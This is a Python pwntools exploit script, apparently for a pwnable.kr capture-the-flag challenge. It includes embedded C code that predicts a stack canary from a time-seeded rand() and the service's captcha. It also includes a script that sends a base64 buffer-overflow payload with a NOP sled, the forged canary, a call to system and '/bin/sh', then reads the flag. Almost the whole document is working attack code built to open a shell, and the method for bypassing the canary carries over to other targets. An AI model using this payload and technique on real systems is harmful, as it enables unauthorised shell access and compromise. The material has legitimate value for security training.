from pwn import *

calc_cookie = r"""
// gcc -o calc_cookie calc_cookie.c
// usage: calc_cookie time captcha
#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
int main(int argc, char **argv) {
    assert(argc == 3);
    int time = atoi(argv[1]);
    int captcha = atoi(argv[2]);
    srand(time);
    int rands[8];
    for(int i = 0; i <= 7; i++) {
        rands[i] = rand();
    }
    int a = rands[1] + rands[2] - rands[3] + rands[4] + rands[5] - rands[6] + rands[7];    
    int cookie = captcha - a;
    printf("%x\n", cookie);
    return 0;
}
"""

pwnfile = r"""
import time

from pwn import *

sh = remote("localhost", 9002)
captcha = sh.recvline_contains("captcha").split(" ")[-1].strip()
sh.sendline(captcha)
print sh.recvuntil("Encode your data with BASE64 then paste me!", timeout=2)
# print sh.recv(timeout=2)
argv = ["/tmp/leo/calc_cookie", "{0}".format(int(time.time())), captcha]
cookie = process(argv).recvline().strip()
call_system = 0x8049187
offset_binsh = 0x804b0e0 + 716
payload = b64e("\x90" * 512 + p32(int(cookie, 16)) + "\x90" * 12 + p32(call_system) + p32(offset_binsh)) + "/bin/sh\x00"
sh.sendline(payload)
sh.recvline_contains("MD5(data)")
sh.sendline("cat flag")
print(sh.recv(1024))
"""

# To eliminate the delay, run on the server
con = ssh("input2", "pwnable.kr", 2222, "guest")
con.shell("mkdir /tmp/leo/")
con.upload_data(calc_cookie, "/tmp/leo/calc_cookie.c")
con.upload_data(pwnfile, "/tmp/leo/pwnfile3.py")
con.shell("gcc -o /tmp/leo/calc_cookie /tmp/leo/calc_cookie.c")
sh = con.run("python -i /tmp/leo/pwnfile3.py")
print(sh.recv(1024))

# Canary, Stack guard, Stack protector.. what is the correct expression?
